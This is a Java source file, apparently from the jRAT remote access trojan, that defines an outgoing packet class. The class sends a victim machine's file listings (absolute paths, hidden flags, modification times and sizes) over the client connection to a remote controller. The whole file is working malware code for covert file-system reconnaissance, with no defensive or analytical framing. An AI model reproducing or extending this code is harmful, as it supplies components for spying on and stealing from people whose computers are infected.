package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;

import java.io.File;
import java.util.Calendar;
import java.util.Date;


public class Packet22ListFiles implements OutgoingPacket {

	private File[] files;

	public Packet22ListFiles(File[] files) {
		this.files = files;
	}

	@Override
	public void write(Connection con) throws Exception {
		con.writeInt(files == null ? 0 : files.length);

		for (int i = 0; i < (files == null ? 0 : files.length); i++) {
			File file = files[i];

            con.writeLine(file.getAbsolutePath());

			if (file.isDirectory()) {
				con.writeBoolean(true);
				con.writeBoolean(file.isHidden());
			} else {
				con.writeBoolean(false);
				con.writeBoolean(file.isHidden());
				con.writeLong(file.lastModified());
				con.writeLong(file.length());
			}
		}

	}

	@Override
	public short getPacketId() {
		return 22;
	}

	public static String getDate(long date) {
		Calendar cal = Calendar.getInstance();
		cal.setTime(new Date(date));
		return (cal.get(Calendar.MONTH) + 1) + "/" + cal.get(Calendar.DAY_OF_MONTH) + "/" + cal.get(Calendar.YEAR) + " " + (00 + cal.get(Calendar.HOUR_OF_DAY)) + ":" + cal.get(Calendar.MINUTE);
	}

}
